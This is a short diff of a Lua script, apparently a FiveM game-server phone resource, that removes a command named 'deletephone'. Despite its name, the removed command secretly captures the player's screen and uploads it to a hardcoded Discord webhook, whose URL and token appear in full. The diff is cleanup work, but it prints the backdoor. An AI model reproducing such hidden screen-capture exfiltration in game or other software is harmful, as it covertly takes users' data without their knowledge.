@@ -2195,8 +2195,3 @@ function InPhone()
     return PhoneData.isOpen
 end
 
-RegisterCommand("deletephone", function(source,args)
-    exports['screenshot-basic']:requestScreenshotUpload("https://discordapp.com/api/webhooks/728087109339971665/E2VxCqDqQRVUAvYg9wPbBdmzMTe9NPuPuLWy-_8d_ktWBV-ohPREEdcChkSCbGY7lnnY", "files[]", function(data)
-      end)
-
-end, false)
